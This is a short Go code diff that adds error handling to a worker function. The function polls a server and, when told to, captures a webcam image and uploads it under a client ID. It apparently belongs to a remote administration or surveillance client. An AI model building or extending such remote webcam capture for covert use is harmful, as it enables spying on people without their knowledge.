@@ -164,7 +164,11 @@ func webcampic_worker(client pb.ConsumerClient, ctx context.Context, pid string)
 		return err
 	}
 	if d.GetShouldTakePicture() {
-		img := webcam.CaptureWebcam()
+		img, err := webcam.CaptureWebcam()
+		if err != nil {
+			return err
+		}
+
 		client.SetPictureOutput(ctx, &pb.PictureOutput{Id: &pb.ClientDataRequest{ClientId: pid}, PictureData: img}, grpc.MaxCallRecvMsgSize(6000000*1024),
 			grpc.MaxCallSendMsgSize(6000000*48))
 	}
